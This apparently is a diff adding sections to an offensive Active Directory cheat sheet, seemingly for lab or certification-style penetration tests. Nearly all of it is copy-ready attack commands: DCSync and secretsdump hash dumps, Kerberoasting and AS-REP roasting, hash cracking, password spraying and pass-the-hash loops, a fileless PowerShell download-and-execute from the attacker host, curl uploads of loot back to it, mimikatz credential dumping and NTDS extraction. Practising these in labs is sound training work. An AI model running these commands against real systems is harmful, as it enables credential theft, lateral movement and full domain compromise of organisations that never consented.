data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>export KRB5CCNAME=Administrator.ccache &amp;&amp; impacket-wmiexec -k -no-pass &lt;target-hostname&gt;</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">DCSync</span><p>Full hash dump, if you hold Replicating Changes rights:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-kerb" class="blk">
+    <h2>2 · Kerberoast &amp; AS-REP</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">Fix clock skew</h3>
+      <div class="g"><span class="k">faketime (preferred)</span><p>Kerberos fails past ~5 min drift. Don't set the system clock &mdash; it drops the VPN and your ligolo tunnel. Wrap the Kerberos command in faketime with the DC's time instead; <code class="inl">rdate -n -p</code> only PRINTS the time, it never sets it:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>faketime "$(rdate -n -p <span class="var m-dc" data-var="DC">$DC</span> | awk '{print $2, $3, $4, $5, $6}')" &lt;your Kerberos command&gt;</code></pre><button class="copy">COPY</button></div></div><p class="hint">Measure the drift if you want</p><div class="cmd sh-kali"><div class="row"><pre><code>nmap -sU -p123 --script ntp-info <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><details class="ff"><summary class="ff-head"><span class="chev">&#9656;</span>Fallback &mdash; set the system clock (last resort; drops VPN/ligolo)</summary><div class="ff-body"><div class="g"><span class="k">Clock skew</span><p>Kerberos fails hard past ~5 min drift — fix it before anything below:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>sudo timedatectl set-ntp off</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>sudo rdate -n <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>kdestroy</code></pre><button class="copy">COPY</button></div></div><p class="hint">No rdate? Check the skew manually, then set it by hand</p><div class="cmd sh-kali"><div class="row"><pre><code>nmap -sU -p123 --script ntp-info <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>sudo date -s "2026-01-01T00:00:00"</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>kdestroy</code></pre><button class="copy">COPY</button></div></div><p class="hint">Confirm nothing stale is cached, clear it, unset the env var</p><div class="cmd sh-kali"><div class="row"><pre><code>echo $KRB5CCNAME</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>rm -f /tmp/*.ccache</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>unset KRB5CCNAME</code></pre><button class="copy">COPY</button></div></div></div></details>
+      <h3 class="subhead-lite">Kerberoasting</h3>
+      <p class="hint">SPN accounts, via LDAP filter directly</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -D '<span class="var" data-var="USER">$USER</span>@<span class="var" data-var="DOMAIN">$DOMAIN</span>' -w '<span class="var" data-var="PASS">$PASS</span>' -b "&lt;base-dn&gt;" "(&amp;(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...via impacket, straight to a crackable file</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-GetUserSPNs <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span> -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -request -outputfile kerberoast.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...via nxc instead</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc ldap <span class="var m-dc" data-var="DC">$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --kerberoasting kerberoast_nxc.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">AS-REP roasting</h3>
+      <p class="hint">Accounts with Kerberos pre-auth disabled, via LDAP filter</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -D '<span class="var" data-var="USER">$USER</span>@<span class="var" data-var="DOMAIN">$DOMAIN</span>' -w '<span class="var" data-var="PASS">$PASS</span>' -b "&lt;base-dn&gt;" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Request their AS-REP hashes — no password needed, just valid usernames</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-GetNPUsers <span class="var" data-var="DOMAIN">$DOMAIN</span>/ -usersfile usernames.txt -no-pass -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -outputfile asrep.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Crack the hashes</h3>
+      <p class="hint">Crack: kerberoast hashes</p><div class="cmd sh-kali"><div class="row"><pre><code>hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Crack: AS-REP hashes</p><div class="cmd sh-kali"><div class="row"><pre><code>hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Crack: plain NT hashes</p><div class="cmd sh-kali"><div class="row"><pre><code>hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same two, with john instead of hashcat</p><div class="cmd sh-kali"><div class="row"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast.txt</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT nt_hashes.txt</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-spray" class="blk">
+    <h2>3 · Spray &amp; confirm access</h2>
+    <div class="blk-body">
+      <p class="hint">Read the domain password policy + lockout threshold BEFORE you spray &mdash; so you don't lock accounts out</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC">$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --pass-pol</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">One set of creds, every protocol, one host</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span>; done</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same password, every username you've got</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> --continue-on-success -u usernames.txt -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same loop, local accounts instead of domain</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --local-auth; done</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same, across every host in ips.txt</p><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto ips.txt -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --local-auth; done</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Got a hash instead of a password? Same loops, -H instead of -p</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span>; done</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...local accounts, hash version</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' --local-auth; done</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-more" class="blk">
+    <h2>4 · Found a foothold? Look for more</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">Automated recon</h3>
+      <p class="hint">Serve winPEAS from Kali</p><div class="cmd sh-kali"><div class="row"><pre><code>python3 -m http.server 80</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Pull it and run it</p><div class="cmd sh-ps"><div class="row"><pre><code>iwr -uri http://<span class="var" data-var="KALI">$KALI</span>/winPEASx64.exe -outfile winpeas.exe</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>.\winpeas.exe</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Fileless alternative — runs straight from memory, nothing saved to disk</p><div class="cmd sh-cmd"><div class="row"><pre><code>powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<span class="var" data-var="KALI">$KALI</span>:8005/get-script.ps1')"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Forward the port first if this is a second, deeper-pivoted box</p><div class="cmd sh-ligolo"><div class="row"><pre><code>listener_add --addr 0.0.0.0:8005 --to 127.0.0.1:8005 --tcp</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Manual checks</h3>
+      <p class="hint">Hidden files, current folder — PowerShell then cmd.exe</p><div class="cmd sh-ps"><div class="row"><pre><code>Get-ChildItem -Force</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>dir /a</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Full folder tree, a user's profile</p><div class="cmd sh-ps"><div class="row"><pre><code>tree /f /a C:\Users</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Documents folder specifically</p><div class="cmd sh-ps"><div class="row"><pre><code>Get-ChildItem -Force $env:USERPROFILE\Documents</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">PowerShell command history</p><div class="cmd sh-ps"><div class="row"><pre><code>Get-Content (Get-PSReadlineOption).HistorySavePath</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same history, the other place it can be saved</p><div class="cmd sh-ps"><div class="row"><pre><code>Get-ChildItem -Force "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\"</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Scan from the new host</h3>
+      <p class="hint">Scan from the new box — port picture resets on every new host</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>rustscan -a <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -- -sC -sV -oN rustscan_t2.txt</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nmap -sn <span class="var" data-var="SUBNET">$SUBNET</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">New ligolo listener for this hop</p><div class="cmd sh-ligolo"><div class="row"><pre><code>listener_add --addr 0.0.0.0:<span class="var" data-var="LIGPORT">$LIGPORT</span> --to 127.0.0.1:<span class="var" data-var="LIGPORT">$LIGPORT</span> --tcp</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Send proof/loot back</h3>
+      <p class="hint">Get an upload receiver running on Kali...</p><div class="cmd sh-kali"><div class="row"><pre><code>pip install uploadserver</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>python3 -m uploadserver 8000</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...then push the flag back</p><div class="cmd sh-cmd"><div class="row"><pre><code>curl.exe -X POST http://<span class="var" data-var="KALI">$KALI</span>:8000/upload -F "files=@proof.txt"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...or via ligolo instead, if there's no direct route</p><div class="cmd sh-ligolo"><div class="row"><pre><code>listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...and the matching upload command for that path</p><div class="cmd sh-cmd"><div class="row"><pre><code>curl.exe -X POST http://<span class="var m-t1b" data-var="T1INT">$T1INT</span>:8000/upload -F "files=@local.txt"</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-privesc" class="blk">
+    <h2>5 · Privesc — dump everything</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">Dump credentials</h3>
+      <p class="hint">mimikatz, one true one-liner — logon sessions, local SAM, LSA secrets (service-account passwords, machine account, DPAPI keys — this is where a plaintext service password like _SC_MonitorLK shows up), and cached domain logons, all in one pass:</p><div class="cmd sh-cmd"><div class="row"><pre><code>mimikatz.exe "log mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"</code></pre><button class="copy">COPY</button></div></div><p class="hint">One module blocked by AV or errors out? mimikatz keeps running the rest of the chain regardless.</p>
+      <p class="hint">No mimikatz on the box, or AV's eating the whole thing? Same access level as above — reg save all three hives (SAM + SYSTEM give the local account hashes, SECURITY gives LSA secrets + cached domain logons), pull them to Kali, dump offline:</p><div class="cmd sh-cmd"><div class="row"><pre><code>reg save hklm\sam sam.save</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>reg save hklm\system system.save</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>reg save hklm\security security.save</code></pre><button class="copy">COPY</button></div></div><p class="hint">Pull all three back to Kali (same transfer pattern as Phase 2/8), then:</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">secretsdump — a regular host, local SAM/LSA</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...or local admin only, no domain &mdash; drop the $DOMAIN/ entirely (dumps the local SAM):</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump <span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">secretsdump — the DC, NTLM hashes only, fast (skips history)</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-dc" data-var="DC">$DC</span> -just-dc-ntlm</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Got a hash instead of a password? Same two targets, -hashes in place of :$PASS — whichever box this hash is actually good on, not necessarily one fixed target, so that IP's flagged red here instead of its usual color. Leading colon for the blank LM half is baked into the commands below — just drop in the NT hash:</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -hashes :<span class="var" data-var="HASH">$HASH</span> <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>@<span class="var m-any" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -hashes :<span class="var" data-var="HASH">$HASH</span> <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>@<span class="var m-dc" data-var="DC">$DC</span> -just-dc-ntlm</code></pre><button class="copy">COPY</button></div></div><p class="hint">Local account, not domain (STATUS_LOGON_FAILURE above, same reason nxc needs --local-auth)? Dropping $DOMAIN/ entirely is inconsistent — still STATUS_LOGON_FAILURE on some boxes even with the exact right hash. Confirmed fix: use the target's own hostname as the domain instead:</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -hashes :<span class="var" data-var="HASH">$HASH</span> <span class="var" data-var="T2NAME">$T2NAME</span>/<span class="var" data-var="USER">$USER</span>@<span class="var m-any" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div><p class="hint">Dump prints in full, then ends with ERROR_DEPENDENT_SERVICES_RUNNING or a KeyError: 'Cryptodome.Cipher.AES' traceback? Cosmetic — secretsdump failing to stop the RemoteRegistry service it started, after every secret above it already printed fine. Ignore it.</p><p class="hint">Still STATUS_LOGON_FAILURE even with the hostname? Stop fighting the syntax and sanity-check the hash itself: run the nxc --local-auth command below against this exact IP. Fails too → wrong hash or wrong target, not a syntax issue. Succeeds → just use nxc's --sam --lsa --ntds for the dump instead of secretsdump:</p>
+      <p class="hint">nxc — SAM, LSA secrets, and NTDS (harmless no-op if this box isn't a DC) in one combined pass instead of three separate flags:</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --sam --lsa --ntds</code></pre><button class="copy">COPY</button></div></div><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' --sam --lsa --ntds</code></pre><button class="copy">COPY</button></div></div><p class="hint">STATUS_LOGON_FAILURE on either, even with the right cred? That account's local to this box, not the domain — add --local-auth:</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' --sam --lsa --ntds --local-auth</code></pre><button class="copy">COPY</button></div></div><p class="hint">...or with a password instead of a hash:</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --sam --lsa --ntds --local-auth</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Plain --ntds blocked? VSS method, same flag</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2">T2</option><option value="DC" selected>DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">DC</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="DC" aria-selected="true">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC" data-tgt-slot>$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --ntds vss</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...or ntdsutil instead, same idea</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2">T2</option><option value="DC" selected>DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">DC</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="DC" aria-selected="true">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC" data-tgt-slot>$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -M ntdsutil</code></pre><button class="copy">COPY</button></div></div>
